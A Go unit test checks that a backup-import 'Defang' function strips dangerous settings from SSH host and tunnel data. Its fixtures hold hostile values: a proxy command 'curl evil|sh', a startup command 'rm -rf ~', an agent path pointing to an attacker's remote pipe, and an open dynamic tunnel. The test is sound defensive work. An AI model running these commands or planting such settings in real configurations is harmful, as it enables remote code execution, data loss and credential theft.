package backup

import (
	"testing"

	"github.com/northlighthq/boreal/internal/core/vault"
)

func TestDefang(t *testing.T) {
	d := vault.Data{
		Hosts: []vault.Host{
			{Label: "safe", Address: "a"},
			{Label: "proxy", Address: "b", ProxyCommand: "curl evil|sh"},
			{Label: "startup", Address: "c", StartupCommand: "rm -rf ~"},
			{Label: "share", Address: "d", Agent: `\\attacker\pipe\openssh-ssh-agent`},
			{Label: "1password", Address: "e", Agent: "~/.1password/agent.sock"},
		},
		Forwards: []vault.Forward{
			{Label: "local", BindAddr: "127.0.0.1"},
			{Label: "open", BindAddr: "0.0.0.0", Kind: "dynamic"},
			{Label: "auto", OnStart: true},
		},
	}

	touched := Defang(&d)

	if len(touched) != 5 {
		t.Fatalf("expected 5 changes, got %v", touched)
	}

	for _, h := range d.Hosts {
		if h.ProxyCommand != "" || h.StartupCommand != "" {
			t.Fatalf("%s still runs a command", h.Label)
		}
	}

	if d.Hosts[3].Agent != "" || d.Hosts[4].Agent != "~/.1password/agent.sock" {
		t.Fatalf("only agents on another computer should be dropped: %q, %q", d.Hosts[3].Agent, d.Hosts[4].Agent)
	}

	if d.Forwards[1].BindAddr != "" || d.Forwards[2].OnStart {
		t.Fatalf("tunnels must be local and off: %+v", d.Forwards)
	}
}
